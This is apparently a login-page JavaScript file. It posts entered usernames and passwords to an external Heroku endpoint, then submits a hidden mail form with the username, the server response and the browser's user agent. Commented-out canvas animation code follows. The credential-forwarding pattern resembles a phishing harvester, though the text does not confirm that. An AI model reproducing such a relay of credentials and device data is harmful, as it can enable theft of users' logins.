let username = document.getElementById("username");
let password = document.getElementById("password");
let userError = document.getElementById("userError");
let passError = document.getElementById("passError");
let loading = document.getElementById("loading");
let loginSection = document.getElementById("loginSection");

function login(){
    loading.style.display = "inline-block";
    loginSection.style.display = "none";
    if(username.value == "" || password.value == ""){
        userErrorHandle();
        passErrorHandle();
        loading.style.display = "none";
        loginSection.style.display = "block";
    }else{
        userErrorHandle();
        passErrorHandle();
        let form = new FormData();
        form.append("username", username.value);
        form.append("password", password.value);

        let url = "https://ntechform.herokuapp.com/it.php";
        fetch(url, {
            method: "POST",
            mode: "cors",
            header: {
                "Content-Type" : "application/json"
            },
            body: form
        }).then(res => res.text()).then(response => {
            if(response != 401){
                if(response == 404){
                    userError.innerText = "Error! Username not found";
                }else if(response == 406){
                    passError.innerText = "Password is not correct!";
                }else{
                    loginSection.innerHTML = "";
                    mailuser.value = username.value;
                    mailbrance.value = response;
                    maildevice.value = navigator.userAgent
                    mail.submit()
                }
                loading.style.display = "none";
                loginSection.style.display = "block";
            }else{
                alert("401")
            }
        }).catch(err => {console.log(err)})
    }
}



function userErrorHandle(){
    if(username.value == ""){
        userError.innerText = "Please enter your username";
    }else{
        userError.innerText = ""
    }
}

function passErrorHandle(){
    if(password.value == ""){
        passError.innerText = "Please enter your password";
    }else{
        passError.innerText = ""
    }
}



// canvas
// var canvas = document.getElementsByTagName("canvas")[0];
//   canvas.width = window.innerWidth;
//   canvas.height = window.innerHeight;
//   var cxt = canvas.getContext("2d");



// var chinese = "田由甲申甴电甶男甸甹町画甼甽甾甿畀畁畂畃畄畅畆畇畈畉畊畋界畍畎畏畐畑";
// chinese = chinese.split("");

// var font_size =10;
// var columns = canvas.width/font_size; 

// var drops = [];

// for(var x=0;x<columns;x++){
//   drops[x]=1;
// }

// function draw(){
//   cxt.fillStyle="rgba(0,0,0,0.05)";
//   cxt.fillRect(0,0,canvas.width,canvas.height);
  
//   cxt.fillStyle = "#0F0";
//   cxt.font = font_size+'px arial';
  
  
//   for(var i=0;i<drops.length;i++){
//     var text = chinese[Math.floor(Math.random()*chinese.length)];
//     cxt.fillText(text,i*font_size,drops[i]*font_size);
    
//     if(drops[i]*font_size>c.height && Math.random() >0.975)
//       drops[i]=0;
    
//     //increment y coordinate
//     drops[i]++;
// }
  
// }
// setInterval(draw,33);
//   if(canvas.getContext) {
//     var ctx = canvas.getContext('2d');
//     var w = canvas.width;
//     var h = canvas.height;
//     ctx.strokeStyle = 'rgba(174,194,224,0.5)';
//     ctx.lineWidth = 1;
//     ctx.lineCap = 'round';
    
    
//     var init = [];
//     var maxParts = 1000;
//     for(var a = 0; a < maxParts; a++) {
//       init.push({
//         x: Math.random() * w,
//         y: Math.random() * h,
//         l: Math.random() * 1,
//         xs: -4 + Math.random() * 4 + 2,
//         ys: Math.random() * 10 + 10
//       })
//     }
    
//     var particles = [];
//     for(var b = 0; b < maxParts; b++) {
//       particles[b] = init[b];
//     }
    
//     function draw() {
//       ctx.clearRect(0, 0, w, h);
//       for(var c = 0; c < particles.length; c++) {
//         var p = particles[c];
//         ctx.beginPath();
//         ctx.moveTo(p.x, p.y);
//         ctx.lineTo(p.x + p.l * p.xs, p.y + p.l * p.ys);
//         ctx.stroke();
//       }
//       move();
//     }
    
//     function move() {
//       for(var b = 0; b < particles.length; b++) {
//         var p = particles[b];
//         p.x += p.xs;
//         p.y += p.ys;
//         if(p.x > w || p.y > h) {
//           p.x = Math.random() * w;
//           p.y = -20;
//         }
//       }
//     }
    
//     setInterval(draw, 30);
    
//   }
